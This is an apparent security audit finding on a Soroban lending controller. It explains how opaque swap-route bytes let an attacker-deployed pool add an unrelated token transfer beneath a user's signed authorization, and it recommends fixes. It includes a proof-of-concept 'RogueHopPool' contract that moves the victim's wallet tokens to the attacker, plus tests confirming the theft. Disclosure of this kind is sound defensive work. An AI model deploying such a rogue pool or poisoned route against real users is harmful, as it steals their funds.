### Title
Malicious swap route can co-opt the caller's authorization tree to transfer unrelated wallet tokens - (File: contracts/controller/src/strategies/swap.rs)

### Summary
`swap_collateral` and the other route-based strategy entrypoints accept opaque route bytes and execute them below the caller-authorized controller invocation. Because route execution can place attacker-selected venue code below that authorization, simulation can add an unrelated `token.transfer(caller, attacker, amount)` as a signed child of the caller's controller authorization. If the user signs the poisoned tree, the attacker receives funds unrelated to the lending swap while the controller's balance and account checks still pass. [1](#0-0) [2](#0-1) 

### Finding Description
`swap_collateral(caller, account_id, current, amount, new, swap)` is reachable by the account owner or delegate and passes the caller-controlled `swap` bytes into `withdraw_and_swap_from_supply`. [3](#0-2)  The withdrawal leg passes those bytes to `swap_tokens_or_passthrough`, which calls `swap_tokens` for distinct assets. [4](#0-3)  `swap_tokens` then invokes the configured router under the controller call while the caller's authorization remains active, and its checks only bound the controller's input-token spend and require positive output. [5](#0-4) 

The route payload is not decoded or restricted by the controller before it reaches third-party venue code. [6](#0-5)  Route-selected third-party code can therefore execute below the caller's authorization and request an additional caller-authorized token transfer that is unrelated to the swap. [2](#0-1)  An honest simulation records that transfer as a child of the caller's `swap_collateral` authorization, so enforcing-mode authorization succeeds when the user signs the returned tree. [7](#0-6) 

### Impact Explanation
This is theft of user funds, not merely loss of the routed amount or protocol slippage. The malicious venue can transfer any token for which the victim can authorize `transfer`, including an asset never supplied to the lending protocol, while still returning fair swap output so `NoSwapOutput`, `RouterOverspend`, and final account-risk checks do not stop it. [8](#0-7) [9](#0-8) 

The same exposure applies to every caller-authenticated route-based controller strategy that ultimately reaches `swap_tokens`: `multiply`, `swap_debt`, `swap_collateral`, `repay_debt_with_collateral`, and any `flash_position` receiver composition using the same router pattern. [10](#0-9) [11](#0-10) 

### Likelihood Explanation
Likelihood is Medium because the attacker must get the victim to submit a malicious route and sign the authorization tree containing the extra child transfer. [12](#0-11)  The attack does not require privileged access, leaked keys, protocol parameter manipulation, or control of the victim's lending account. [13](#0-12)  A route builder or interface that treats the opaque payload and simulated authorization tree as trustworthy can expose ordinary users to the crafted child authorization. [14](#0-13) 

### Recommendation
Do not permit controller-routed calls into arbitrary route-selected contracts. Add a governance-maintained allowlist of route venues and pool/token contract addresses, decode the route before execution, and reject any route that can invoke an unapproved address. [15](#0-14) 

Until routes are constrained on-chain, clients must decode the route and reject any simulated authorization tree containing children beyond the exact expected transfer set. For an honest controller route this means no unexpected caller-authorized token transfer beneath the controller invocation; a direct router swap should contain only the declared input transfer. [14](#0-13) 

### Proof of Concept
1. Alice owns a lending account with USDC collateral and holds `WALLET_BALANCE` of an unrelated token.
2. The attacker supplies a `swap_collateral` route whose venue/pool contract pays the controller a fair ETH output but also calls `unrelated_token.transfer(alice, attacker, WALLET_BALANCE)`. [16](#0-15) 
3. Alice calls `swap_collateral(caller = alice, account_id = alice_account, current = USDC, amount = swap_amount, new = ETH, swap = malicious_route)`. [17](#0-16) 
4. The controller withdraws the collateral, calls the router with the opaque route, receives positive ETH output, deposits it, and passes its measured-balance and final-risk checks. [18](#0-17) 
5. Simulation records `unrelated_token.transfer(alice, attacker, WALLET_BALANCE)` as a child of Alice's `swap_collateral` authorization. [19](#0-18) 
6. When Alice signs that tree, the malicious transfer executes: Alice's unrelated-token balance becomes zero and the attacker receives the full wallet balance. [12](#0-11)

### Citations

**File:** contracts/controller/src/strategies/swap.rs (L24-54)
```rust
    let controller = env.current_contract_address();
    let router_addr = storage::get_swap_aggregator(env);
    let router = SwapAggregatorClient::new(env, &router_addr);
    let token_in_client = token::Client::new(env, token_in);

    // Snapshot before router execution to measure its spend and output.
    let in_before = token_in_client.balance(&controller);
    let out_before = token::Client::new(env, token_out).balance(&controller);

    // Authorize only this token transfer to this router for this exact amount.
    authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in);

    storage::with_flash_guard(env, || {
        let _ = router.execute_strategy(&controller, &amount_in, swap);
    });

    // Reject input gains or overspending; refund only this swap's unused input.
    let in_after = token_in_client.balance(&controller);
    assert_with_error!(env, in_after <= in_before, StrategyError::RouterOverspend);
    let actual_spent = in_before - in_after;
    assert_with_error!(
        env,
        actual_spent <= amount_in,
        StrategyError::RouterOverspend
    );
    let leftover = amount_in - actual_spent;
    if leftover > 0 {
        token_in_client.transfer(&controller, refund_to, &leftover);
    }

    verify_router_output(env, token_out, out_before)
```

**File:** docs/explanation/threat-model.md (L154-164)
```markdown
That bound covers the controller's own grant only. The router calls the pool
and token addresses its payload names and keeps no allowlist of them, so a
route can put third-party code on the call stack below the caller's
authorization. A token transfer that such code makes from the caller is
recorded by an honest simulation as a child of the caller's authorization
entry, and it executes if the caller signs that tree. The loss is then the
caller's wallet, not the routed amount, and neither the payload minimum nor the
final risk gate bounds it. An honest swap strategy gives the caller no child
entry, and a direct router swap gives exactly one input transfer. A client must
decode the route it signs and refuse an authorization tree with any other
child. The direct `execute_strategy` path has the same exposure for every swap
```

**File:** contracts/controller/src/strategies/swap_collateral.rs (L40-76)
```rust
    require_authorized_caller(env, caller);

    assert_with_error!(env, current != new, GenericError::AssetsAreTheSame);
    config::require_hub_active(env, current.hub_id);
    require_positive_amount(env, from_amount);

    let mut account = storage::get_account(env, account_id);
    account::require_owner_or_delegate(env, account_id, caller, &account.owner);
    let mut cache = Context::new(env);
    // Check the destination before withdrawing existing collateral.
    require_can_supply(env, &mut cache, account.spoke_id, new);

    let extra_assets = vec![env, current.asset.clone(), new.asset.clone()];
    prefetch_strategy_prices(&mut cache, &account, &extra_assets);

    let swapped_amount = withdraw_and_swap_from_supply(
        env,
        &mut account,
        &mut cache,
        caller,
        current,
        from_amount,
        &new.asset,
        swap,
        events::PositionAction::SwColWd,
    );

    let deposit_assets = vec![env, (new.clone(), swapped_amount)];
    supply::process_deposit(
        env,
        &env.current_contract_address(),
        &mut account,
        &deposit_assets,
        &mut cache,
    );

    strategy_finalize(env, account_id, &mut account, &mut cache);
```

**File:** contracts/controller/src/strategies/legs.rs (L246-259)
```rust
    let actual_withdrawn = withdraw_collateral_to_controller(
        env,
        account,
        cache,
        StrategyWithdraw {
            hub_asset: from,
            amount,
            position: &supply_pos,
            action,
        },
    );

    swap_tokens_or_passthrough(env, caller, &from.asset, actual_withdrawn, token_out, swap)
}
```

**File:** skills/xoxno-swap-aggregator/composition.md (L53-60)
```markdown
`routeXdr` is present when `slippage` was sent (always for swaps; optional for
`convertLiquidity`; `pipeline.rs` clears it when `slippage` is absent). Pass it
untouched: `steps: { routeXdr: quote.routeXdr }` or
`mapQuoteResponseToStrategySwap(quote)` (returns `{ routeXdr }` when present). The
builders decode base64 into Soroban `Bytes` via `asStellarStrategySwapBytes`; the
controller forwards those bytes to the router as `swap_xdr` without decoding them.
Set `referralId` on the quote request: the server encodes it into `routeXdr`, and the
builders cannot add it later.
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L50-70)
```rust
/// Attacker-deployed "pool". `amount == 0` is the benign control.
#[contract]
pub struct RogueHopPool;

#[contractimpl]
impl RogueHopPool {
    pub fn __constructor(env: Env, victim: Address, token: Address, to: Address, amount: i128) {
        env.storage()
            .instance()
            .set(&symbol_short!("PLAN"), &(victim, token, to, amount));
    }

    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L199-222)
```rust
    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L224-226)
```rust
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L258-268)
```rust
    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
```

**File:** contracts/controller/src/strategies/multiply.rs (L90-97)
```rust
    let swapped_collateral = swap_tokens_or_passthrough(
        env,
        caller,
        &debt.asset,
        swap_amount_in,
        &collateral.asset,
        swap,
    );
```

**File:** interfaces/controller/src/lib.rs (L88-117)
```rust
    fn swap_debt(
        env: Env,
        caller: Address,
        account_id: u64,
        existing_debt: HubAssetKey,
        amount: i128,
        new_debt: HubAssetKey,
        swap: Bytes,
    );

    fn swap_collateral(
        env: Env,
        caller: Address,
        account_id: u64,
        current: HubAssetKey,
        amount: i128,
        new: HubAssetKey,
        swap: Bytes,
    );

    fn repay_debt_with_collateral(
        env: Env,
        caller: Address,
        account_id: u64,
        collateral: HubAssetKey,
        collateral_amount: i128,
        debt: HubAssetKey,
        swap: Bytes,
        close_position: bool,
    );
```

**File:** contracts/controller/src/lib.rs (L280-301)
```rust
    /// Withdraws `amount` of `current`, converts it to `new` via `swap` and
    /// redeposits the proceeds. Requires owner or delegate authorization.
    #[when_not_paused]
    fn swap_collateral(
        env: Env,
        caller: Address,
        account_id: u64,
        current: HubAssetKey,
        amount: i128,
        new: HubAssetKey,
        swap: Bytes,
    ) {
        strategies::swap_collateral::process_swap_collateral(
            &env,
            &caller,
            SwapCollateralParams {
                account_id,
                current: &current,
                from_amount: amount,
                new: &new,
                swap: &swap,
            },
```
